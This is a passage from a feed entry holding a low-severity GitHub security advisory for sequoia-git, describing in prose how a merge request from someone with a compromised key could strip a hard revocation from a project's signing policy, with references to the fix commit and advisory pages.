<p>An attacker could nevertheless exploit this flaw as follows. Consider Alice and Bob who maintain a project together.  If Bob's
certificate is compromised and Bob issues a hard revocation, Alice can add it to the project's signing policy.  An attacker who has
access to Bob's key can then create a merge request that strips the hard revocation.  If Alice merges Bob's merge request, then
the latest commit will not carry the hard revocation, and <code>sq-git</code> will not see the hard revocation when authenticating that commit or any following commits.</p>
<p>Note: for this attack to be successful, Alice needs to be tricked into merging the malicious MR.  If Alice is reviewing MRs, then she is likely to notice changes to the signing policy.</p>
<p>Reported-by: Hassan Sheet</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://gitlab.com/sequoia-pgp/sequoia-git/-/commit/f9c9074bd80023456221f09c3c4ff19957ee9c58">https://gitlab.com/sequoia-pgp/sequoia-git/-/commit/f9c9074bd80023456221f09c3c4ff19957ee9c58</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0109.html">https://rustsec.org/advisories/RUSTSEC-2026-0109.html</a></li>
<li><a href="https://github.com/advisories/GHSA-g27r-r6ph-vf5r">https://github.com/advisories/GHSA-g27r-r6ph-vf5r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g27r-r6ph-vf5r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-04T22:28:50.000Z</published>
    </entry>
</feed>